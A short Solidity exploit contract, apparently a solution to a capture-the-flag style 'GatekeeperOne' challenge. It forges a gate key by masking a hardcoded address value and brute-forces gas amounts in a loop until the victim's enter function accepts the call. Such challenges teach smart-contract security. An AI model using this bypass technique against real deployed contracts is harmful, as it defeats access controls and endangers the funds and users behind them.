// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../GatekeeperOne.sol';

contract GatekeeperOneExploit {

    GatekeeperOne public victimContract;
    bytes8 txOrigin16 = 0xeb3dC3FF624d46Aa;
    bytes8 gateKey = txOrigin16 & 0xFFFFFFFF0000FFFF;

    constructor(address _victimContractAddr) {
        victimContract = GatekeeperOne(_victimContractAddr);
    }

    function enter() public {
        for(uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(victimContract).call{ gas: i + 150 + 8191 * 3 }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result) break;
        }
    }
}
